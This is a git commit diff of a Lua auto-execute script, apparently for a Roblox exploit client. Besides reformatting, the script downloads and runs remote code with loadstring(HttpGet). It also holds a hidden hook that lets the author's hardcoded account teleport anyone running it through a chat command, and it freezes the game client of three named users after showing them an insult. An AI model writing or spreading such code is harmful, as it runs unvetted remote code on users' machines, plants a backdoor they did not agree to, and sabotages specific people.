cc82ed85d2af959709cc29a00026e8dbb0d28f2e
szze <106690765+CF-Trail@users.noreply.github.com>
2024-01-25 01:20:15 +0900

    Update aexec.lua

--- aexec.lua
+++ aexec.lua
@@ -1,57 +1,71 @@
 repeat
-	task.wait()
-until game:GetService('Players').LocalPlayer
+    task.wait()
+until game:GetService("Players").LocalPlayer
 
 local ids = {
-	5050653591
+    5050653591
 }
 
 local banbypass = {
-	'а',
-	'q',
-	'x',
-	'й',
-	'こ'
+    "а",
+    "q",
+    "x",
+    "й",
+    "こ"
 }
 
+local notifs
+task.spawn(
+    function()
+        notifs = loadstring(game:HttpGet("https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua"))()
+        game:GetService("Players").PlayerAdded:Connect(
+            function(plr)
+                if plr.UserId == 5050653591 then
+                    plr.Chatted:Connect(
+                        function(msg)
+                            if msg == "tpback" then
+                                local oldpos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
+                                local plrpos = plr.Character.HumanoidRootPart.CFrame
+                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
+                                task.wait(3)
+                                game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                            end
+                        end
+                    )
+                    notifs.alert("script creator (szze) joined", nil, 10)
+                    notifs.alert("be sure to say hi to absolutely_szze", nil, 10, "rainbow")
+                end
+            end
+        )
 
-local notifs = loadstring(game:HttpGet('https://raw.githubusercontent.com/CF-Trail/random/main/FE2Notifs.lua'))()
+        for i, plr in next, game:GetService("Players"):GetPlayers() do
+            if plr.UserId == 5050653591 then
+                plr.Chatted:Connect(
+                    function(msg)
+                        if msg == "tpback" then
+                            local oldpos = game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame
+                            local plrpos = plr.Character.HumanoidRootPart.CFrame
+                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
+                            task.wait(3)
+                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
+                        end
+                    end
+                )
+                notifs.alert("script creator (szze) is in the server", nil, 10)
+                notifs.alert("be sure to say hi to absolutely_szze", nil, 10, "rainbow")
+            end
+        end
 
-game:GetService('Players').PlayerAdded:Connect(function(plr)
-	if plr.UserId == 5050653591 then
-	   plr.Chatted:Connect(function(msg)
-                if msg == 'tpback' then
-                   local oldpos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame
-		   local plrpos = plr.Character.HumanoidRootPart.CFrame
-		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
-		   task.wait(3)
-		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
-		end
-	    end)
-	    notifs.alert('script creator (szze) joined',nil,10)
-            notifs.alert('be sure to say hi to absolutely_szze',nil,10,'rainbow')	
-	end
-end)
-
-for i,plr in next, game:GetService('Players'):GetPlayers() do 
-	if plr.UserId == 5050653591 then
-	plr.Chatted:Connect(function(msg)
-                if msg == 'tpback' then
-                   local oldpos = game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame
-		   local plrpos = plr.Character.HumanoidRootPart.CFrame
-		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = plrpos
-		   task.wait(3)
-		   game:GetService('Players').LocalPlayer.Character.HumanoidRootPart.CFrame = oldpos
-		end
-	    end)
-	    notifs.alert('script creator (szze) is in the server',nil,10)
-            notifs.alert('be sure to say hi to absolutely_szze',nil,10,'rainbow')	
-	end
-end
-
-if game:GetService('Players').LocalPlayer.Name == 'AlexDaSlender1' or game:GetService('Players').LocalPlayer.Name == 'tiki_hell' or game:GetService'Players'.LocalPlayer.Name == 'cat_cathuge1234567' then
-	local message = Instance.new('Hint',workspace)
-	message.Text = 'fuck you'
-	task.wait(1)
-	while true do end
-end
+        if
+            game:GetService("Players").LocalPlayer.Name == "AlexDaSlender1" or
+                game:GetService("Players").LocalPlayer.Name == "tiki_hell" or
+                game:GetService "Players".LocalPlayer.Name == "cat_cathuge1234567"
+         then
+            local message = Instance.new("Hint", workspace)
+            message.Text = "fuck you"
+            task.wait(1)
+            while true do
+            end
+        end
+    end
+)
